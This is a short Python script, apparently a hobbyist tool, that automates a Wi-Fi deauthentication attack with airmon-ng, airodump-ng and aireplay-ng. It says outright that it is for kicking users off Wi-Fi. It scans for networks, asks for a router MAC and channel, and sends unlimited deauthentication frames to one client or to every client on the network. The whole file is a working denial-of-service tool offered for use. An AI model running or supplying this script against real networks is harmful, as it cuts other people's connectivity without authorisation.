import os
import time
import keyboard

motd = """AIREPLAY PYTHON SCRIPT BY ERROR404CZ

Use to terminate users from WIFI
Using airmon-ng, airodump-ng, aireplay-ng
!Must use with SUDO!

Pres ENTER to continue"""

print(motd)

keyboard.wait('enter')

mac = "MAC"
channel = "CHANNEL"
attack = "ATTACK"

os.system("sudo airmon-ng start wlp4s0")
os.system("sudo airodump-ng wlp4s0mon")
print()

mac = input("Write MAC address of router to attack:     ")

channel = input("Write channel to attack:     ")

attack = input("Write MAC address to attack (if -null- it will broadcast to all):     ")

os.system(f"sudo iwconfig wlp4s0mon channel {channel}")

if(attack==""):
    os.system(f"sudo aireplay-ng -0 0 -a {mac} wlp4s0mon")
else:
    os.system(f"sudo aireplay-ng -0 0 -a {mac} -c {attack} wlp4s0mon")

os.system("sudo airmon-ng stop wlp4s0mon")